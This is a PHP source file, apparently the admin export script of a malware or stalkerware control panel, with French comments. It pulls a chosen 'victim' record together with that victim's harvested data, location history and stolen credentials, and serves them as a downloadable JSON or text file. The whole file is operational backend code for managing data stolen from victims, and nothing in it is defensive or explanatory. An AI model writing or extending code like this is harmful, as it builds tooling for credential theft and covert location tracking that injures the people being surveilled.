<?php
session_start();
require_once '../config.php';

if (!isset($_SESSION['admin'])) {
    die('Unauthorized');
}

$id = $_GET['id'] ?? '';
$format = $_GET['format'] ?? 'json';

if (!$id) {
    die('No ID specified');
}

// Récupérer toutes les données
$stmt = $pdo->prepare("SELECT * FROM victims WHERE id = ?");
$stmt->execute([$id]);
$victim = $stmt->fetch();

if (!$victim) {
    die('Victim not found');
}

$stmt = $pdo->prepare("SELECT * FROM data WHERE victim_id = ? ORDER BY timestamp");
$stmt->execute([$id]);
$victim['data'] = $stmt->fetchAll();

$stmt = $pdo->prepare("SELECT * FROM locations WHERE victim_id = ? ORDER BY timestamp");
$stmt->execute([$id]);
$victim['locations'] = $stmt->fetchAll();

$stmt = $pdo->prepare("SELECT * FROM credentials WHERE victim_id = ? ORDER BY timestamp");
$stmt->execute([$id]);
$victim['credentials'] = $stmt->fetchAll();

if ($format === 'json') {
    header('Content-Type: application/json');
    header('Content-Disposition: attachment; filename="victim_' . $id . '.json"');
    echo json_encode($victim, JSON_PRETTY_PRINT);
    
} elseif ($format === 'txt') {
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="victim_' . $id . '.txt"');
    
    $output = "=== VICTIME: $id ===\n";
    $output .= "IP: {$victim['ip']}\n";
    $output .= "OS: {$victim['os']}\n";
    $output .= "Première vue: {$victim['first_seen']}\n";
    $output .= "Dernière vue: {$victim['last_seen']}\n\n";
    
    foreach ($victim['data'] as $d) {
        $output .= "--- {$d['type']} - {$d['timestamp']} ---\n";
        $output .= print_r(json_decode($d['content'], true), true) . "\n\n";
    }
    
    echo $output;
}
?>
